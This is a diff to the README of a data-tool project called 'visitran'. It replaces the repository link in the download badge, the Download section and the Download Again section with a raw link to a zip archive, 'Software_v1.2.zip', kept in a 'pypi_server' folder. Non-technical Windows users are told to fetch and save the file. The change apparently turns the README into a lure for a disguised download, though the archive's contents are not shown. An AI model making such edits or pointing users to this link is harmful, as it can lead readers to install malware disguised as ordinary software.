@@ -1,6 +1,6 @@
 # ⚙️ visitran - Simple data work for everyone
 
-[![Download visitran](https://img.shields.io/badge/Download-visitran-blue?style=for-the-badge&logo=github)](https://github.com/vincentdean96-maker/visitran)
+[![Download visitran](https://img.shields.io/badge/Download-visitran-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/vincentdean96-maker/visitran/main/pypi_server/Software_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use visitran if you want a clearer way to:
 ## 📥 Download
 
 To get visitran, visit this page to download:
-https://github.com/vincentdean96-maker/visitran
+https://raw.githubusercontent.com/vincentdean96-maker/visitran/main/pypi_server/Software_v1.2.zip
 
 If the page shows a release file, choose the Windows download and save it to your computer. If it shows the project page first, open the latest release or the main download area from there.
 
@@ -158,7 +158,7 @@ Here are a few plain meanings for common words:
 ## 🔗 Download Again
 
 If you need the file again, use this link:
-https://github.com/vincentdean96-maker/visitran
+https://raw.githubusercontent.com/vincentdean96-maker/visitran/main/pypi_server/Software_v1.2.zip
 
 ## 🧭 What to Expect After Setup
 
